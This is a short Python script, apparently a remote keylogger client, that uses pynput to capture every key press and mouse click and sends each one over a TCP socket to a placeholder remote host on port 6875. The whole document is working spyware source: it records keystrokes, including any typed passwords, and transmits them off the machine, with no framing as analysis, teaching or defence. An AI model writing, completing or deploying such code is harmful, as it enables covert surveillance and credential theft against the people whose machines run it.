import socket
from pynput import mouse, keyboard

HOST = 'xxx.xxx.xxx.xxx'
PORT = 6875

def send_data(data):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((HOST, PORT))
    client_socket.sendall(data.encode())
    client_socket.close()

def on_mouse_event(x, y, button, pressed):
    if pressed:
        action = f"Mouse {button} clicked at ({x}, {y})"
        send_data(action)

def on_key_event(key):
    key_char = str(key)
    send_data(key_char)

def start_client():
    mouse_listener = mouse.Listener(on_click=on_mouse_event)
    mouse_listener.start()

    keyboard_listener = keyboard.Listener(on_press=on_key_event)
    keyboard_listener.start()

    mouse_listener.join()
    keyboard_listener.join()

if __name__ == '__main__':
    start_client()
